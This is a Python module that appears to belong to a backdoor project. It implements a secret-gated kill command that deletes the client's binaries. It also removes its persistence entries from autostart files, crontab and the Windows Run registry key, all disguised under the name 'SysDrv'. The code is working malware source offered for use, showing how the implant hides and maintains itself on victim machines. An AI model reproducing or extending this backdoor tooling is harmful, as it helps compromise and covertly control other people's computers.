# modules/secure_kill.py

import os
import sys
import subprocess
from modules.persistence import get_system_paths
from modules.file_protect import quitar_proteccion

# Clave secreta para kill — cargar desde variable de entorno, nunca hardcodear
KILL_SECRET = os.environ.get("BACKDOORS_KILL_SECRET", "CHANGE_ME_BEFORE_DEPLOY")

def autodestruir_cliente():
    paths = get_system_paths()
    main_bin = os.path.abspath(sys.argv[0])
    # Quita protección para permitir borrado
    for p in paths + [main_bin]:
        try:
            quitar_proteccion(p)
            if os.path.exists(p):
                os.remove(p)
        except Exception:
            continue
    # Elimina autoarranque, crontab, etc.
    if os.name != "nt":
        desktop_dir = os.path.expanduser("~/.config/autostart/")
        for f in os.listdir(desktop_dir):
            if "SysDrv" in f:
                try:
                    os.remove(os.path.join(desktop_dir, f))
                except Exception:
                    pass
        subprocess.run("crontab -l | grep -v SysDrv | crontab -", shell=True, stderr=subprocess.DEVNULL)
    else:
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            regpath = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, regpath, 0, winreg.KEY_SET_VALUE) as reg:
                winreg.DeleteValue(reg, "SysDrv")
        except Exception:
            pass

def run(cmd, *args):
    # Permite kill solo con clave secreta
    if cmd == "kill" and args and args[0] == KILL_SECRET:
        autodestruir_cliente()
        os._exit(0)
        return "[+] Cliente eliminado correctamente."
    return "[!] Comando no permitido o clave incorrecta."
